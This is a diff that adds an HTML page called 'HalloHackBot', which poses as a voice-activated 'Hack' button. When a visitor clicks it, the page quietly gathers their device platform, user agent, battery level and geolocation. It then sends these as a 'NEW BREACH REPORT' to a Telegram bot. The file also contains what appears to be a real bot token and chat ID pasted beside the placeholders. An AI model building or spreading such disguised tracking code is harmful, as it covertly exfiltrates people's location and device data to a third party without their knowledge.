@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HalloHackBot</title>
+    <style>
+        body { background: #000; color: #ff0000; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        #micBtn {
+            width: 150px; height: 150px; border-radius: 50%;
+            background: #ff0000; border: 8px solid #330000; color: white;
+            font-size: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+        #status { margin-top: 20px; font-weight: bold; text-align: center; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <button id="micBtn"></button>
+    <div id="status">   "Hack" ...</div>
+
+<script>
+    const micBtn = document.getElementById('micBtn');
+    const statusText = document.getElementById('status');
+
+    const TG_TOKEN = "Your_Telegram_Bot_API";8589760834:AAHOik7sTdB2wag1O7NF5BmpbhuLs8l8tUs
+    const CHAT_ID = "Your_Telegram_Chat_ID";6959842682
+
+    
+    async function startExtraction() {
+        statusText.innerText = "   ...";
+        
+        let report = {
+            time: new Date().toLocaleString(),
+            device: navigator.platform,
+            ua: navigator.userAgent,
+            battery: "N/A",
+            loc: "Permission Denied"
+        };
+
+        // 
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                report.battery = `${(b.level * 100).toFixed(0)}%`;
+            }
+        } catch(e) {}
+
+        
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await sendToTelegram(report);
+        }, async (err) => {
+            await sendToTelegram(report); //      
+        }, {timeout: 5000});
+    }
+
+    async function sendToTelegram(data) {
+        const text = ` *NEW BREACH REPORT* \n\n` +
+                     ` *Time:* ${data.time}\n` +
+                     ` *Device:* ${data.device}\n` +
+                     ` *Battery:* ${data.battery}\n` +
+                     ` *Location:* ${data.loc}\n\n` +
+                     ` *UA:* \`${data.ua.substring(0, 70)}...\``;
+
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            });
+            if(res.ok) {
+                statusText.innerHTML = "";
+            }
+        } catch (e) {
+            statusText.innerText = "Error!";
+        }
+    }
+
+    //     
+    const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+    if (SpeechRecognition) {
+        const recognition = new SpeechRecognition();
+        recognition.lang = 'en-US';
+
+        micBtn.onclick = () => {
+            startExtraction(); 
+            recognition.start();
+            statusText.innerText = "Listening... 'Hack' ";
+        };
+
+        recognition.onresult = (e) => {
+            const cmd = e.results[0][0].transcript.toLowerCase();
+            if (cmd.includes('hack') || cmd.includes('')) {
+                
+            }
+        };
+    } else {
+        micBtn.onclick = startExtraction;
+    }
+</script>
+</body>
+</html>
